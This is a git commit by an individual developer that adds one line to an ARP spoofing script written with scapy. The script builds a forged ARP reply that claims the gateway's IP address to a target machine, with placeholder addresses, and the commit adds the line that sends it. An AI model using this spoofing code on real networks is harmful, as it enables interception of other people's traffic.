9419954cd8e779560c3450fde81cbca0c7a5fc14
Ahmed Khaled <ahmedkhaledabab@gmail.com>
2020-01-30 18:22:07 +0200

    sending response packet

--- arp-spoofer/arp_spoofer.py
+++ arp-spoofer/arp_spoofer.py
@@ -8,3 +8,4 @@ import scapy.all as scapy
 
 # you can get the pdst and hwdst fields from the network scanner, psrc must be equal to the gateway IP address. 
 packet = scapy.ARP(op=2, pdst="<target_ip>", hwdst="<target_mac>", psrc="<gw_ip>")
+scapy.send(packet)
